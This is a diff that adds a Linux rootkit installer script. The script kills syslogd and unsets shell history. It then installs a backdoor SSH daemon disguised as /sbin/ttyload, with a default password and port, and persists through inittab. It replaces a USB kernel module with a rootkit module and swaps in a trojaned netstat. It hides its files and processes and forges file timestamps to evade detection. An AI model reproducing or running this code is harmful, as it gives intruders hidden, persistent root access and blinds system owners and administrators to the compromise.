@@ -1,0 +1,177 @@
+#!/bin/bash
+
+##########define variables##########
+DEFPASS=123456
+DEFPORT=43958
+BASEDIR=`pwd`
+SSHDIR=/lib/libsh.so
+HOMEDIR=/usr/lib/libsh
+
+unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE
+export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+
+##########check is root##########
+if [ "$(whoami)" != "root" ]; then
+   echo "BECOME ROOT AND TRY AGAIN"
+   echo ""
+   exit
+fi
+
+##########extract all tar##########
+tar zxf bin.tgz
+cd bin
+tar zxf sshd.tgz
+rm -rf ./sshd.tgz
+cd $BASEDIR
+rm -rf bin.tgz
+cd $BASEDIR
+
+##########kill syslogd##########
+killall -9 syslogd >/dev/null 2>&1
+sleep 2
+
+##########remove sh.conf##########
+if [ -f /etc/sh.conf ]; then
+  rm -rf /etc/sh.conf
+fi
+
+##########initialize sshd configuration##########
+if test -n "$1" ; then
+   echo "Using Password : $1"
+   cd $BASEDIR/bin
+   echo -n $1|md5sum > /etc/sh.conf
+else
+   echo "No Password Specified, using default - $DEFPASS"
+   echo -n $DEFPASS|md5sum > /etc/sh.conf
+fi
+
+
+touch -acmr /bin/ls /etc/sh.conf
+chown -f root:root /etc/sh.conf
+
+if test -n "$2" ; then
+   echo "Using ssh-port : $2"
+   echo "Port $2" >> $BASEDIR/bin/.sh/sshd_config
+   cat $BASEDIR/bin/.sh/shdcf2 >> $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2
+   mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf
+else
+   echo "No ssh-port Specified, using default - $DEFPORT"
+   echo "Port $DEFPORT" >> $BASEDIR/bin/.sh/sshd_config
+   cat $BASEDIR/bin/.sh/shdcf2 >> $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2
+   mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf
+fi
+
+###########creating dirs##########
+SSHDIR=/lib/libsh.so
+HOMEDIR=/usr/lib/libsh
+
+if [ -d /lib/libsh.so ]; then
+   rm -rf /lib/libsh.so
+fi
+
+if [ -d /usr/lib/libsh ]; then
+   rm -rf /usr/lib/libsh/*
+fi
+
+mkdir $SSHDIR
+touch -acmr /bin/ls $SSHDIR
+mkdir $HOMEDIR
+touch -acmr /bin/ls $HOMEDIR
+
+cd $BASEDIR/bin
+mv .sh/* $SSHDIR/
+mv .sh/.bashrc $HOMEDIR
+
+if [ -f /sbin/ttyload ]; then
+   chattr -AacdisSu /sbin/ttyload
+   rm -rf /sbin/ttyload
+fi
+
+if [ -f /usr/sbin/ttyload ]; then
+   rm -rf /usr/sbin/ttyload
+fi
+
+if [ -f /sbin/ttymon ]; then
+   rm -rf /sbin/ttymon
+fi
+
+mv $SSHDIR/sshd /sbin/ttyload
+chmod a+xr /sbin/ttyload
+chmod o-w /sbin/ttyload
+touch -acmr /bin/ls /sbin/ttyload
+kill -9 `pidof ttyload` >/dev/null 2>&1
+
+mv $BASEDIR/bin/ttymon /sbin/ttymon
+chmod a+xr /sbin/ttymon
+touch -acmr /bin/ls /sbin/ttymon
+kill -9 `pidof ttymon` >/dev/null 2>&1
+
+cp /bin/bash $SSHDIR
+
+##########modify inittab##########
+cp /etc/inittab /etc/.inittab
+sed -e 's@^1:2345@0:2345:once:/usr/sbin/ttyload\n&@' /etc/inittab > /etc/.inittab
+touch -acmr /etc/inittab /etc/.inittab
+mv -f /etc/.inittab /etc/inittab
+
+echo "/sbin/ttyload -q > /dev/null 2>&1" > /usr/sbin/ttyload
+echo "/sbin/ttymon > /dev/null 2>&1" >> /usr/sbin/ttyload
+echo "${HOMEDIR}/tty i \`pidof ttyload\` > /dev/null 2>&1" >> /usr/sbin/ttyload
+echo "${HOMEDIR}/tty i \`pidof ttymon\` > /dev/null 2>&1" >> /usr/sbin/ttyload
+
+touch -acmr /bin/ls /usr/sbin/ttyload
+chmod 755 /usr/sbin/ttyload
+/usr/sbin/ttyload > /dev/null 2>&1
+
+touch -amcr /bin/ls /etc/inittab
+
+###########make sure inittab has modified##########
+
+if [ ! "`grep ttyload /etc/inittab`" ]; then
+   echo "# WARNING - SSHD WONT BE RELOADED UPON RESTART "
+   echo "# inittab shuffling probly fucked-up ! "
+fi
+
+##########load rk.ko##########
+cd $BASEDIR
+modprobe -r ehci-hcd
+mv -f rk.ko /lib/modules/`uname -r`/kernel/drivers/usb/host/ehci-hcd.ko
+modprobe ehci-hcd
+mv tty $HOMEDIR
+
+##########replace netstat##########
+touch -acmr /bin/netstat netstat
+mv -f netstat /bin/netstat
+
+##########hide all files and process##########
+$HOMEDIR/tty h /etc/sh.conf > /dev/null 2>&1
+$HOMEDIR/tty h /lib/libsh.so > /dev/null 2>&1
+$HOMEDIR/tty h /usr/lib/libsh > /dev/null 2>&1
+$HOMEDIR/tty h /sbin/ttyload > /dev/null 2>&1
+$HOMEDIR/tty h /usr/sbin/ttyload > /dev/null 2>&1
+$HOMEDIR/tty h /sbin/ttymon > /dev/null 2>&1
+$HOMEDIR/tty i `pidof ttyload` > /dev/null 2>&1
+$HOMEDIR/tty i `pidof ttymon` > /dev/null 2>&1
+
+##########load rk.ko on boot##########
+cat > /etc/sysconfig/modules/ehci.modules << EOF
+#!/bin/sh
+#install usb modules support
+modprobe -r ehci-hcd
+modprobe ehci-hcd
+EOF
+touch -amcr /bin/ls /etc/sysconfig/modules/ehci.modules
+
+chmod 755 /etc/sysconfig/modules/ehci.modules
+$HOMEDIR/tty h /etc/sysconfig/modules/ehci.modules > /dev/null 2>&1
+
+##########check iptables setting##########
+if [ -f /sbin/iptables ]; then
+   echo "`/sbin/iptables -L INPUT | head -5`"
+else
+   echo ""
+   echo "# lucky for u no iptables found"
+fi
+
+##########start syslogd##########
+/sbin/syslogd -m 0
